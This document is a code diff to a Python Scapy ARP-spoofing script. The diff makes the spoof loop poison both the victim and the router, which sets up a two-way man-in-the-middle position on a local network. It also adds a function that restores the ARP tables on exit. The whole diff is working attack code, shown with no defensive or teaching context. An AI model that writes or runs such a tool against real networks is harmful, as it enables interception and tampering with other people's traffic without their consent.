@@ -31,6 +31,13 @@ def spoof(target_ip, spoof_ip):
     arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(arp_response, verbose=False)
 
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip , hwsrc=src_mac)
+    scapy.send(arp_response, count=4, verbose=False)
+
+
 options = get_argument()
 spoof_ip = options.router_ip
 target_ip = options.target_ip
@@ -38,7 +45,11 @@ target_ip = options.target_ip
 try:
     while True:
         spoof(target_ip, spoof_ip)
+        spoof(spoof_ip,target_ip)
         print("[+] Sent spoofed ARP packet to target.")
         time.sleep(2)
 except KeyboardInterrupt:
+    restore(target_ip, spoof_ip)
+    restore(spoof_ip, target_ip)
+    print("[+] Restored ARP tables.")
     print("\n[!] Detected CTRL+C. Exiting...")
